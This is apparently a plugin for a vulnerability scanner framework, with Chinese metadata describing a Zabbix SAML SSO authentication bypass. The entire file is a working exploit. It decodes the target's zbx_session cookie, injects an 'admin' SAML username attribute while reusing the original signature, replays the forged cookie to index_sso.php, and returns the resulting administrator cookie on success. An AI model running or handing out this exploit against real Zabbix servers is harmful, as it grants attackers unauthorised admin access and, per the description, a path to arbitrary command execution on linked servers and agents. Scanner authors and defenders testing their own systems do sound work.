# -*-* coding:UTF-8
import base64
import json
import re
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Zabbix身份验证绕过漏洞",
        "description": "在启用SAML SSO身份验证的实例上，它允许绕过身份验证并获得管理员权限。攻击者可以使用此访问权限在链接的Zabbix Server和Zabbix Agent实例上执行任意命令",
        "references": ["-"],
    }

    def __condition__(self):
        return self.condition(
            matches=[
                {
                    "search": "body",
                    "keyword": ["zabbix", "Zabbix SIA"]
                }
            ]
        )

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./',
            timeout=15
        )
        if r.status_code == 200:
            cookie = r.headers.get("Set-Cookie", "")
            zbx_session = re.findall("zbx_session=(.*?); ", cookie)
            if zbx_session:
                url_decode_data = urllib.parse.unquote(zbx_session[0], encoding='utf-8')
                base64_decode_data = base64.b64decode(url_decode_data).decode()
                to_json = json.loads(base64_decode_data)
                tmp_ojb = dict(
                    saml_data=dict(username_attribute='admin'),
                    sessionid=to_json["sessionid"],
                    sign=to_json["sign"]
                )
                cookie = urllib.parse.quote(base64.b64encode(json.dumps(tmp_ojb).encode()))
                r = self.request(
                    method='get',
                    path='./index_sso.php',
                    headers={
                        'Connection': 'close',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'Cookie': "zbx_session=" + cookie
                    }
                )
                if "action=dashboard.view" in r.text:
                    self.__info__.update({"cookie": cookie})
                    return {"LoopholeInfo": self.__info__}
